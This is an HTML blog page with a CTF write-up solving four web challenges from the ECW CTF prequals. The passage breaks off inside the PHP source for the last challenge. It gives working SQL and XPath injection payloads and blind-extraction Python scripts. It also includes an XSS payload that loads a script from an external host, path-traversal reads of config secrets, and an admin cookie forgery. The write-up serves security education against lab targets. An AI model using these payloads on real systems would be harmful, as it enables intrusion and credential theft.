@@ -1,0 +1,460 @@
+<!doctype html>
+<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">
+
+<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="generator" content="Zola" />
+  <title>ECW CTF - Web Writeups | Swissky's Lab</title>
+  <meta property="og:site_name" content="Swissky&apos;s Lab" />
+  <meta property="og:title" content="ECW CTF - Web Writeups" />
+  <meta name="description" content="Challenges&apos;s Writeup - Online PrequalsWeb 50 - Hall of FameWeb 100 - Pass ThroughWeb 150 - GoldFishWeb 175 - Magic Car" />
+  <meta property="og:description" content="Challenges&apos;s Writeup - Online PrequalsWeb 50 - Hall of FameWeb 100 - Pass ThroughWeb 150 - GoldFishWeb 175 - Magic Car" />
+  <meta property="og:url" content="https://swisskyrepo.github.io/blog/ecw-ctf/" />
+  <link rel="canonical" href="https://swisskyrepo.github.io/blog/ecw-ctf/" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2017-11-07T00:00:00+00:00" />
+  <meta property="og:image" content="https://swisskyrepo.github.io/images/ecw.png" />
+  <meta property="og:image:alt" content="ECW CTF - Web Writeups" />
+  <meta property="og:image:width" content="640" />
+  <meta property="og:image:height" content="431" />
+  <meta property="og:image:type" content="image/png" />
+  <link rel="alternate" type="application/atom+xml" href="https://swisskyrepo.github.io/atom.xml" title="Swissky&apos;s Lab | Atom" />
+  <link rel="alternate" type="application/rss+xml" href="https://swisskyrepo.github.io/rss.xml" title="Swissky&apos;s Lab | RSS" />
+  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
+  <!-- Begin Head inject -->
+  
+  <!-- End Head inject -->
+  <link rel="stylesheet" href="https://swisskyrepo.github.io/main.min.css?h=fc65ba308cf36d3ba82c" />
+  <style>
+  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
+  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
+  </style>
+  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://swisskyrepo.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/png" href="https://swisskyrepo.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
+  <link rel="icon" type="image/png" href="https://swisskyrepo.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
+  <script src="https://swisskyrepo.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
+  <script src="https://swisskyrepo.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
+  <!-- Begin Head End inject -->
+  <!-- Umami analytics -->
+<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="https://swisskyrepo.github.io/files/custom.css">
+
+<!-- HEAD END -->
+  <!-- End Head End inject -->
+</head>
+
+<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
+  <!-- Header -->
+<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
+  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center min-h-8">
+        <a title="Go to home page" accesskey="!"
+          href="https://swisskyrepo.github.io/" class="text-2xl font-semibold">Swissky&#x27;s Lab</a>
+        <button type="button" title="Switch color scheme" accesskey="$"
+          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
+        ></button>
+        <button type="button" title="Search" accesskey="/"
+          onclick="window.linkita.toggleSearch();"
+          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
+        ></button>
+        <script>window.linkita.initSearchButton({ scripts: ["https://swisskyrepo.github.io/elasticlunr.min.js", "https://swisskyrepo.github.io/search_index.en.js"] });</script>
+      </div>
+      <div title="Menu" role="button" accesskey="+" tabindex="0"
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        onclick="window.linkita.toggleHeaderMenu();"
+        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
+      ></div>
+    </div>
+    <nav class="flex w-full items-center lg:w-auto">
+      <menu
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/projects"
+          >Projects</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/posts"
+          >Posts</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/about"
+          >About</a>
+        </li>
+      </menu>
+      <!-- Begin Header Nav inject -->
+      
+      <!-- End Header Nav inject -->
+    </nav>
+  </div>
+</header>
+
+  <!-- Begin Body Start inject -->
+  
+  <!-- End Body Start inject -->
+  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
+    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
+      <!-- Search -->
+<div id="linkita-search-wrapper" class="hidden">
+  <ul id="linkita-search-results"></ul>
+</div>
+
+    
+<article>
+  <!-- Begin Page Start inject -->
+  
+  <!-- End Page Start inject -->
+
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">ECW CTF - Web Writeups</h1>
+    <!-- Page Info -->
+<div class="text-sm antialiased opacity-80"><time
+      datetime="2017-11-07T00:00:00+00:00">2017-11-07</time><span
+        class="mx-1">&middot;</span><time
+    datetime="PT0H4M0S">4&nbsp;min</time>
+</div>
+
+  </header>
+  <figure class="mb-12 mt-0">
+    <img
+      class="h-auto w-full rounded-lg"
+      src="https://swisskyrepo.github.io/images/ecw.png"
+      alt="ECW CTF - Web Writeups"
+      width="640"
+      height="431"
+    />
+  </figure>
+  <!-- TOC -->
+<div class="block-bg mb-12 rounded-lg p-2 text-lg">
+  <details>
+    <summary class="select-none py-0.5 lg:py-1 pl-4" accesskey="=">
+      <span class="cursor-pointer">Table of Contents</span>
+    </summary>
+    <div class="px-2">
+      <ul>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/ecw-ctf/#challenges-s-writeup-online-prequals">Challenges&#x27;s Writeup - Online Prequals</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/ecw-ctf/#web-50-hall-of-fame">Web 50 - Hall of Fame</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/ecw-ctf/#web-100-pass-through">Web 100 - Pass Through</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/ecw-ctf/#web-150-goldfish">Web 150 - GoldFish</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/ecw-ctf/#web-175-magic-car">Web 175 - Magic Car</a>
+        </li>
+      </ul>
+    </div>
+  </details>
+</div>
+
+  <!-- Content -->
+  <section><h2 id="challenges-s-writeup-online-prequals">Challenges's Writeup - Online Prequals</h2>
+<ul>
+<li><a href="https://swisskyrepo.github.io/blog/ecw-ctf/ECW-CTF/#web-50---hall-of-fame">Web 50 - Hall of Fame</a></li>
+<li><a href="https://swisskyrepo.github.io/blog/ecw-ctf/ECW-CTF/#web-100---pass-through">Web 100 - Pass Through</a></li>
+<li><a href="https://swisskyrepo.github.io/blog/ecw-ctf/ECW-CTF/#web-150---goldfish">Web 150 - GoldFish</a></li>
+<li><a href="https://swisskyrepo.github.io/blog/ecw-ctf/ECW-CTF/#web-175---magic-car">Web 175 - Magic Car</a></li>
+</ul>
+<span id="continue-reading"></span><h2 id="web-50-hall-of-fame">Web 50 - Hall of Fame</h2>
+<p>This challenge was a basic SQL injection, let's follow our [methodology](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL injection/MySQL Injection.md) and extract the informations in the database. First we need to extract the columns number of the current "SELECT column1, column2 FROM ..."</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>1&#39;  union select 1,2,3,4,5,6#
+</span></code></pre>
+<p>We can clearly see the injection point is located in the 4th columns.</p>
+<p>Let's extract the version now</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>1&#39;  union select 1,2,3,version(),5,6#
+</span><span>5.7.17-0ubuntu0.16.04.1	5
+</span></code></pre>
+<p>Extract database name</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>1&#39;  union select 1,2,3,gRoUp_cOncaT(0x7c,schema_name,0x7c),5,6 fRoM information_schema.schemata#
+</span><span>3	|information_schema|,|ecw|	5
+</span></code></pre>
+<p>This is interesting, there is an ECW database. Let's dig into it by extracting the table name.</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>1&#39;  union select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C),5,6 fRoM information_schema.tables wHeRe table_schema=&quot;ecw&quot;#
+</span><span>3	|users|	5
+</span></code></pre>
+<p>Extract columns name</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>1&#39;  union select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C),5,6 fRoM information_schema.columns wHeRe table_name=&quot;users&quot;#
+</span><span>3	|rank|,|username|,|score|,|password|,|comment|	5
+</span></code></pre>
+<p>That's great now we can do a simple "SELECT" query to get the username and password of every users.</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>1&#39;  union select 1,2,3,gRoUp_cOncaT(password),5,6 fRoM users#
+</span><span>ECW{69d7da73beaab34d6034211c0d848848},
+</span><span>ECW{e0d409de9fa2e61e6635e27fb73cc5e7},
+</span><span>ECW{2455afd815b54a0ce60b73074c3a652c},
+</span><span>ECW{cdf6c1b0ce7b41872a267d66e2b2dfa0},
+</span><span>ECW{8361993d2541062b311e61b0ade994ee},
+</span><span>ECW{420c7523b0a7ba0f8f40f8e98cad3c38},
+</span><span>ECW{77a66a027d20c8ecce920d3c3d8fb2c8},
+</span><span>ECW{03e8d7e2fc14e0a8b4b978f8367e6d3b},
+</span><span>ECW{b55ec992616468307c6cc4154dfd37a3},
+</span><span>ECW{d0c7cc155840d91c17fb3c885320ce1f},
+</span><span>ECW{c18018cb461d3b299bb5c437454abc80}
+</span></code></pre>
+<p>Unfortunately there are a lot of flags, we can try them all.. or be a little bit smarter.
+Since we can dump the content we can try to export the "comment" section</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>1&#39;  union select 1,2,3,gRoUp_cOncaT(comment,password,0x7c),5,6 fRoM users#
+</span><span>I love french fries and create CTFECW{77a66a027d20c8ecce920d3c3d8fb2c8}|,
+</span></code></pre>
+<p>This one looked promising, and we can validate with it.</p>
+<h2 id="web-100-pass-through">Web 100 - Pass Through</h2>
+<p>At first, I was looking for an SQL injection in order to bypass the login, the following payload worked:</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>Username:admin
+</span><span>Password:&#39; or &#39;1&#39;=&#39;1
+</span><span>Authentification validée. Le mot de passe est le flag.
+</span></code></pre>
+<p>It says the "password is the flag", damn we need to extract it with a blind injection. After a lot of tries I discovered it was an XPATH injection instead of an SQL. We will use the string-length to check the size of a string, here we know the size of the username, this will help verify our guess.</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>&#39; or &#39;1&#39;=&#39;1&#39; and string-length(username)=5 and &#39;1&#39;=&#39;1
+</span><span>&#39; or &#39;1&#39;=&#39;1&#39; and string-length(username)&gt;4 and &#39;1&#39;=&#39;1
+</span><span>&#39; or &#39;1&#39;=&#39;1&#39; and string-length(password)&gt;40 and &#39;1&#39;=&#39;1 NOK
+</span><span>&#39; or &#39;1&#39;=&#39;1&#39; and string-length(password)&gt;10 and &#39;1&#39;=&#39;1 OK
+</span><span>&#39; or &#39;1&#39;=&#39;1&#39; and string-length(password)&gt;20 and &#39;1&#39;=&#39;1 OK
+</span><span>&#39; or &#39;1&#39;=&#39;1&#39; and string-length(password)&gt;30 and &#39;1&#39;=&#39;1 OK
+</span></code></pre>
+<p>Now we can script this in order to extract the size of the password, since we know it's &gt;20 and &lt;40.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>passwdlen = </span><span style="color:#d08770;">0
+</span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">20</span><span>,</span><span style="color:#d08770;">40</span><span>):
+</span><span>payload = {
+</span><span>  &#39;</span><span style="color:#a3be8c;">nonce</span><span>&#39;:&#39;</span><span style="color:#a3be8c;">26a7ef027c271845670d1abc96014f2cfa5df865721b70d43cb51a0d93264553d1411815be8f68132ef7927e3a8eeb21a8da3b88fc0f521513babd55b10c9d29</span><span>&#39;,
+</span><span>  &#39;</span><span style="color:#a3be8c;">username</span><span>&#39;: &#39;</span><span style="color:#a3be8c;">admin</span><span>&#39;,
+</span><span>  &#39;</span><span style="color:#a3be8c;">password</span><span>&#39;: &quot;</span><span style="color:#a3be8c;">&#39; or &#39;1&#39;=&#39;1&#39; and string-length(password)=REPLACE and &#39;1&#39;=&#39;1</span><span>&quot;.</span><span style="color:#bf616a;">replace</span><span>(&#39;</span><span style="color:#a3be8c;">REPLACE</span><span>&#39;,</span><span style="color:#bf616a;">str</span><span>(i))
+</span><span>}
+</span><span>r = requests.</span><span style="color:#bf616a;">post</span><span>(url, </span><span style="color:#bf616a;">data</span><span>=payload, </span><span style="color:#bf616a;">cookies </span><span>= {&#39;</span><span style="color:#a3be8c;">session</span><span>&#39;: session}, </span><span style="color:#bf616a;">verify</span><span>=</span><span style="color:#d08770;">False </span><span>).text
+</span><span style="color:#b48ead;">if </span><span>not &quot;</span><span style="color:#a3be8c;">invalide</span><span>&quot; in r:
+</span><span>passwdlen = i
+</span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">Password length : </span><span>&quot;+</span><span style="color:#bf616a;">str</span><span>(i)
+</span></code></pre>
+<p>The output of this script will give the the length of the password : 37</p>
+<p>Now we will extract the characters one by one with the "substring" method, e.g:substring("ABCD",2,1)='B'</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/python
+</span><span style="color:#65737e;"># -*- coding: utf-8 -*-
+</span><span style="color:#b48ead;">import </span><span>sys, getopt
+</span><span style="color:#b48ead;">import </span><span>requests
+</span><span style="color:#b48ead;">from </span><span>requests.packages.urllib3.exceptions </span><span style="color:#b48ead;">import </span><span>InsecureRequestWarning
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &quot;</span><span style="color:#a3be8c;">__main__</span><span>&quot;:
+</span><span>  requests.packages.urllib3.</span><span style="color:#bf616a;">disable_warnings</span><span>(InsecureRequestWarning)
+</span><span>  url = &quot;</span><span style="color:#a3be8c;">https://challenge-ecw.fr/chals/web100</span><span>&quot;
+</span><span>  session = &quot;</span><span style="color:#a3be8c;">.eJwVj0Frg0AQRv9KmbOHRC0EoZeiCVuYkbQTZfZmEqO7ugYixdWQ_157e_AeH3xPGO7DpYbkCW9nSACtbiksHKYqkkVFyM2GWCI8HL2UXzZnmZC_HTpywkWnbRMSX2Ys1X-zwZAM8b5d-R0XFVJ62mJ49JRmPk-zrbhTrK3EyDjrUqKcVaSZ2vxQ9GKVF247YTJ52jpZPh2x8sTZIm5v9LolNptk6Tu03Qe8Avgd68dQufUA_ExmHLsZAqiuzgyQ3Kp-rAPoq6FZ9e2xGnOFZBe__gBfKVAP.DLpGFw.xgJdaSDoDQNmN4w0D1OTDWYWiIs</span><span>&quot;
+</span><span>
+</span><span>  passwdlen = </span><span style="color:#d08770;">37
+</span><span>  password=&quot;&quot;
+</span><span>  </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(passwdlen-</span><span style="color:#d08770;">5</span><span>,passwdlen+</span><span style="color:#d08770;">20</span><span>):
+</span><span>    </span><span style="color:#b48ead;">for </span><span>c </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">32</span><span>,</span><span style="color:#d08770;">250</span><span>):
+</span><span>      payload = {
+</span><span>        &#39;</span><span style="color:#a3be8c;">nonce</span><span>&#39;:&#39;</span><span style="color:#a3be8c;">26a7ef027c271845670d1abc96014f2cfa5df865721b70d43cb51a0d93264553d1411815be8f68132ef7927e3a8eeb21a8da3b88fc0f521513babd55b10c9d29</span><span>&#39;,
+</span><span>        &#39;</span><span style="color:#a3be8c;">username</span><span>&#39;: &#39;</span><span style="color:#a3be8c;">admin</span><span>&#39;,
+</span><span>        &#39;</span><span style="color:#a3be8c;">password</span><span>&#39;: &quot;</span><span style="color:#a3be8c;">&#39; or substring(password,</span><span>&quot;+</span><span style="color:#bf616a;">str</span><span>(i)+&quot;</span><span style="color:#a3be8c;">,1)=&#39;</span><span>&quot;+</span><span style="color:#96b5b4;">chr</span><span>(c)
+</span><span>      }
+</span><span>      r = requests.</span><span style="color:#bf616a;">post</span><span>(url, </span><span style="color:#bf616a;">data</span><span>=payload, </span><span style="color:#bf616a;">cookies </span><span>= {&#39;</span><span style="color:#a3be8c;">session</span><span>&#39;: session}, </span><span style="color:#bf616a;">verify</span><span>=</span><span style="color:#d08770;">False </span><span>).text
+</span><span>      </span><span style="color:#b48ead;">print </span><span>payload[&#39;</span><span style="color:#a3be8c;">password</span><span>&#39;]
+</span><span>
+</span><span>      </span><span style="color:#b48ead;">if </span><span>not &quot;</span><span style="color:#a3be8c;">invalide</span><span>&quot; in r:
+</span><span>        password += </span><span style="color:#96b5b4;">chr</span><span>(c)
+</span><span>        </span><span style="color:#b48ead;">print </span><span>password
+</span><span>        </span><span style="color:#b48ead;">break
+</span></code></pre>
+<p>With this we get BCPP6f5f5724aa2fa973bb9471746c2cb4a0} which looks like a flag, we can easily correct the first chars : ECW{6f5f5724aa2fa973bb9471746c2cb4a0}</p>
+<h2 id="web-150-goldfish">Web 150 - GoldFish</h2>
+<p>GoldFish was a Web Application written in PHP, where you can write a "post-it" which will self-destroy after 30sec.
+For this challenge I created a user named "glopglopglop" this will be needed for the exploitation ;)</p>
+<p>First I tried to exploit an XSS, you could write a "Post" with the following input:</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>postname: reflected in the url
+</span><span>content : reflected in the page
+</span></code></pre>
+<p>The "Post" would be available at "/posts/user/postname" (this URL was found when you submit the same post twice in less than 30sec)</p>
+<p>Here is a simple output that triggered the XSS (the payload is from XSSHunter), it was available at https://challenge-ecw.fr/chals/web150/posts/glopglopglop/mymemo</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>My super memo content!&quot;&gt;&lt;/</span><span style="color:#bf616a;">textarea</span><span>&gt;&lt;/</span><span style="color:#bf616a;">blockquote</span><span>&gt;&lt;</span><span style="color:#bf616a;">script </span><span style="color:#d08770;">src</span><span>=</span><span style="color:#a3be8c;">https://[REDACTED].xss.ht</span><span>&gt;&lt;/</span><span style="color:#bf616a;">script</span><span>&gt;
+</span><span>&lt;</span><span style="color:#bf616a;">script </span><span style="color:#d08770;">src</span><span>=</span><span style="color:#a3be8c;">https://[REDACTED].xss.ht</span><span>&gt;&lt;/</span><span style="color:#bf616a;">script</span><span>&gt;
+</span></code></pre>
+<p>I waited hours and hours, nothing happened..</p>
+<p>Then I try to fuzz a little bit the "name" field since we could "rewrite" the URL. I finally managed to find an LFI with the source code reflected in the dashboard inside the memo. Thanks to this we could extract all the source code of the WebApp</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>../../index.php
+</span><span>../../include/session.php
+</span><span>function checkCookie()
+</span><span>{
+</span><span>  $user = null;
+</span><span>  if(isset($_COOKIE[&#39;web150&#39;]))
+</span><span>  {
+</span><span>    $data = explode(&#39;_&#39;, $_COOKIE[&#39;web150&#39;]);
+</span><span>    if(count($data) == 2)
+</span><span>    {
+</span><span>
+</span><span>      $id = $data[0];
+</span><span>      $cipher = $data[1];
+</span><span>      $userData = findUserById($id);
+</span><span>      if($userData != null)
+</span><span>      {
+</span><span>        if(strcmp(decryptString($cipher, $userData[&#39;login&#39;]), $userData[&#39;login&#39;]) == 0)
+</span><span>        $user = $userData;
+</span><span>      }
+</span><span>    }
+</span><span>  }
+</span><span>
+</span><span>../../include/config.php
+</span><span>$db_name = &#39;web150&#39;;
+</span><span>$db_login = &#39;web150&#39;;
+</span><span>$db_pass = &#39;Hell0Challenger!&#39;;
+</span><span>function generateHash($pPass)
+</span><span>{
+</span><span>  $salt = &#39;uH39*z_f-D48w&#39;;
+</span><span>  return hash(&#39;sha256&#39;, $salt . hash(&#39;sha256&#39;, $pPass));
+</span><span>}
+</span></code></pre>
+<p>The cookie part was interesting, it is decrypting its content with "decryptString". By looking deeper in the generation of the cookie I discovered it was based on the name of the user but the password wasn't part of it.</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>function encryptString($pText){
+</span><span>  $key = generateKey($pText);
+</span><span>  $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC), MCRYPT_RAND);
+</span><span>  $iv_to_pass_to_decryption = base64_encode($iv);
+</span><span>  return base64_encode($iv . mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $pText, MCRYPT_MODE_CBC, $iv));
+</span><span>}
+</span></code></pre>
+<p>This encrypted string was used in the cookie as follow:</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>&gt;&gt;&gt; import hackercodecs
+</span><span>&gt;&gt;&gt; &quot;123_i89j6%2FHxno%2Bj14Thft%2BjlzbpzP1Qvqq6znJHbFMAdJ7YTFLiq0I4gzzsHrtFgr1ND%2FsuFU8H8A%2FI86YU5X0qIQ%3D%3D&quot;.decode(&#39;url&#39;)
+</span><span>&#39;123_i89j6/Hxno+j14Thft+jlzbpzP1Qvqq6znJHbFMAdJ7YTFLiq0I4gzzsHrtFgr1ND/suFU8H8A/I86YU5X0qIQ==&#39;
+</span><span>#id_encryptedstring_in_base64_in_url_encoded
+</span></code></pre>
+<p>This means we can forge our cookie to be connected as admin since we only need a valid hash based on his name.</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#ab7967;">&lt;?php </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">generateKey</span><span>($</span><span style="color:#bf616a;">pKey</span><span>)
+</span><span>{
+</span><span>  </span><span style="color:#b48ead;">if </span><span>($</span><span style="color:#bf616a;">pKey </span><span>== </span><span style="color:#d08770;">null </span><span>|| </span><span style="color:#96b5b4;">strlen</span><span>($</span><span style="color:#bf616a;">pKey</span><span>) == </span><span style="color:#d08770;">0</span><span>)
+</span><span>  </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">null</span><span>;
+</span><span>
+</span><span>  $</span><span style="color:#bf616a;">s </span><span>= &#39;&#39;;
+</span><span>  </span><span style="color:#b48ead;">while </span><span>(</span><span style="color:#96b5b4;">strlen</span><span>($</span><span style="color:#bf616a;">s</span><span>)&lt; </span><span style="color:#d08770;">1000</span><span>)
+</span><span>  $</span><span style="color:#bf616a;">s </span><span>.= $</span><span style="color:#bf616a;">pKey</span><span>;
+</span><span>
+</span><span>  $</span><span style="color:#bf616a;">e1 </span><span>= </span><span style="color:#d08770;">2</span><span>;
+</span><span>  $</span><span style="color:#bf616a;">e2 </span><span>= </span><span style="color:#d08770;">3</span><span>;
+</span><span>  $</span><span style="color:#bf616a;">r </span><span>= &#39;&#39;;
+</span><span>  </span><span style="color:#b48ead;">for </span><span>($</span><span style="color:#bf616a;">i </span><span>= </span><span style="color:#d08770;">0 </span><span>; $</span><span style="color:#bf616a;">i </span><span>&lt; </span><span style="color:#d08770;">12 </span><span>; $</span><span style="color:#bf616a;">i</span><span>++)
+</span><span>  {
+</span><span>    $</span><span style="color:#bf616a;">e2 </span><span>+= $</span><span style="color:#bf616a;">e1</span><span>;
+</span><span>    $</span><span style="color:#bf616a;">e1 </span><span>= $</span><span style="color:#bf616a;">e2 </span><span>- $</span><span style="color:#bf616a;">e1</span><span>;
+</span><span>    $</span><span style="color:#bf616a;">r </span><span>.= $</span><span style="color:#bf616a;">s</span><span>[$</span><span style="color:#bf616a;">e2</span><span>];
+</span><span>  }
+</span><span>
+</span><span>  </span><span style="color:#b48ead;">return </span><span style="color:#96b5b4;">pack</span><span>(&#39;</span><span style="color:#a3be8c;">H*</span><span>&#39;, </span><span style="color:#96b5b4;">md5</span><span>($</span><span style="color:#bf616a;">r</span><span>));
+</span><span>}
+</span><span>
+</span><span>$</span><span style="color:#bf616a;">user_id</span><span>=&quot;</span><span style="color:#a3be8c;">1</span><span>&quot;;
+</span><span>$</span><span style="color:#bf616a;">key </span><span>= </span><span style="color:#bf616a;">generateKey</span><span>(&quot;</span><span style="color:#a3be8c;">admin</span><span>&quot;);
+</span><span>$</span><span style="color:#bf616a;">iv </span><span>= </span><span style="color:#96b5b4;">mcrypt_create_iv</span><span>(</span><span style="color:#96b5b4;">mcrypt_get_iv_size</span><span>(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC), MCRYPT_RAND);
+</span><span>$</span><span style="color:#bf616a;">iv_to_pass_to_decryption </span><span>= </span><span style="color:#96b5b4;">base64_encode</span><span>($</span><span style="color:#bf616a;">iv</span><span>);
+</span><span>$</span><span style="color:#bf616a;">encrypt </span><span>= </span><span style="color:#96b5b4;">base64_encode</span><span>($</span><span style="color:#bf616a;">iv </span><span>. </span><span style="color:#96b5b4;">mcrypt_encrypt</span><span>(MCRYPT_RIJNDAEL_256, $</span><span style="color:#bf616a;">key</span><span>, &quot;</span><span style="color:#a3be8c;">admin</span><span>&quot;, MCRYPT_MODE_CBC, $</span><span style="color:#bf616a;">iv</span><span>));
+</span><span style="color:#96b5b4;">echo </span><span>$</span><span style="color:#bf616a;">user_id </span><span>. &#39;</span><span style="color:#a3be8c;">_</span><span>&#39; . $</span><span style="color:#bf616a;">encrypt</span><span>;
+</span><span style="color:#ab7967;">?&gt;
+</span></code></pre>
+<p>The "ID" of admin was '1', after replacing our cookie with the forged one we get the following flag:</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>Well done! This is the super flag : ECW{527007e99d5068963281e660d5fb5a8d}
+</span></code></pre>
+<h2 id="web-175-magic-car">Web 175 - Magic Car</h2>
+<p>The topic of this challenge was the following text: "Notre nouveau système de réservation de covoiturage a été piraté. Le pirate a ajouté un nouveau formulaire d'authentification et a changé le mot de passe administrateur. Nous avons réussi à retrouver le code source de l'interface, mais nous ne pouvons pas récupérer le service sans les informations d'identification valides.
+Aide nous à les retrouver.". We had to find a way to login without a valid username/password. The source code of the challenge was also provided.</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#ab7967;">&lt;?php
+</span><span style="color:#b48ead;">require_once</span><span>(&quot;</span><span style="color:#a3be8c;">flag.php</span><span>&quot;);
+</span><span>$</span><span style="color:#bf616a;">sec_pass </span><span>= &quot;</span><span style="color:#a3be8c;">0e413229387827631581229643338212</span><span>&quot;;
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#96b5b4;">isset</span><span>($</span><span style="color:#bf616a;">_POST</span><span>[&#39;</span><span style="color:#a3be8c;">username</span><span>&#39;]) &amp;&amp; </span><span style="color:#96b5b4;">isset</span><span>($</span><span style="color:#bf616a;">_POST</span><span>[&#39;</span><span style="color:#a3be8c;">password</span><span>&#39;])) {
+</span><span>  </span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#96b5b4;">md5</span><span>($</span><span style="color:#bf616a;">_POST</span><span>[&#39;</span><span style="color:#a3be8c;">password</span><span>&#39;] . $</span><span style="color:#bf616a;">_POST</span><span>[&#39;</span><span style="color:#a3be8c;">username</span><span>&#39;]) == $</span><span style="color:#bf616a;">sec_pass</span><span>){
